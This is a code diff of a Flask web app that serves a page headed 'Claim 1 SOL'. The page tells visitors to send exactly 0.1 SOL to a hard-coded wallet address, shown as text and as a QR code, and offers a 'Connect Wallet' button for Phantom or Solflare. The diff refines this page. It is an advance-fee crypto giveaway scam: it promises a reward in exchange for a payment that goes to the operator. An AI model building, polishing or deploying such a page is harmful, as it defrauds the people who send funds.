@@ -5,96 +5,94 @@ app = Flask(__name__)
 WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
 QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"
 
-HTML_PAGE = """
+HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Claim 1 SOL</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
       background-color: #000;
       color: #fff;
-      font-family: sans-serif;
+      font-family: Arial, sans-serif;
       text-align: center;
       padding: 40px;
     }
-
     .button {
-      background: linear-gradient(90deg, #00ff90, #00d178);
+      background: linear-gradient(to right, #00ff90, #00d178);
       border: none;
-      padding: 14px 30px;
-      font-size: 1.2em;
-      margin: 15px;
-      border-radius: 30px;
-      cursor: pointer;
       color: #000;
       font-weight: bold;
+      padding: 14px 30px;
+      font-size: 16px;
+      border-radius: 30px;
+      cursor: pointer;
+      margin: 20px;
     }
-
-    #qrCode {
+    .button:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+    }
+    img.qr {
       width: 220px;
       margin: 20px auto;
       border-radius: 16px;
       box-shadow: 0 0 20px #00ff90;
       display: none;
     }
-
-    code {
-      font-size: 1.1em;
-      background: #111;
-      padding: 5px 10px;
-      border-radius: 6px;
-    }
-
-    footer {
-      margin-top: 50px;
+    #status {
+      margin-top: 20px;
+      color: #aaa;
       font-size: 0.9em;
-      color: #888;
     }
   </style>
 </head>
 <body>
-
-  <h1>Claim 1 SOL Reward</h1>
-  <p>Send exactly <b>0.1 SOL</b> to:</p>
+  <h1>Claim 1 SOL</h1>
+  <p>Send exactly <strong>0.1 SOL</strong> to:</p>
   <p><code>{{ wallet }}</code></p>
-  <img id="qrCode" src="{{ qr_url }}" alt="QR Code" />
-
-  <p id="status">Click "Connect Wallet" to begin</p>
-  <button class="button" onclick="connectPhantom()">Connect Wallet</button>
-
-  <footer>&copy; 2025 CoinUpdater</footer>
+  <img id="qrCode" class="qr" src="{{ qr_url }}" alt="QR Code" />
+  
+  <button class="button" onclick="connectWallet()">Connect Wallet</button>
+  <div id="status">Click "Connect Wallet" to begin.</div>
 
   <script>
-    async function connectPhantom() {
-      const provider = window.phantom?.solana;
+    async function connectWallet() {
+      let provider = null;
 
-      if (provider && provider.isPhantom) {
+      if (window.phantom?.solana?.isPhantom) {
+        provider = window.phantom.solana;
+      } else if (window.solflare?.isSolflare) {
+        provider = window.solflare;
+      } else if (window.solana?.isPhantom || window.solana?.isSolflare) {
+        provider = window.solana;
+      }
+
+      if (provider) {
         try {
           const resp = await provider.connect();
           document.getElementById("status").innerText =
             "✅ Connected: " + resp.publicKey.toString();
         } catch (err) {
-          console.error("User rejected the connection", err);
-          document.getElementById("status").innerText = "❌ Connection rejected";
+          console.error("Connection rejected", err);
+          document.getElementById("status").innerText = "❌ Connection rejected.";
         }
       } else {
         document.getElementById("status").innerText =
-          "⚠️ Phantom not detected. Open this page in Phantom or Solflare browser.";
+          "⚠️ Wallet not detected. Please open this page inside the Solflare app.";
         document.getElementById("qrCode").style.display = "block";
       }
     }
   </script>
-
 </body>
 </html>
 """
 
 @app.route("/")
 def index():
-    return render_template_string(HTML_PAGE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)
+    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
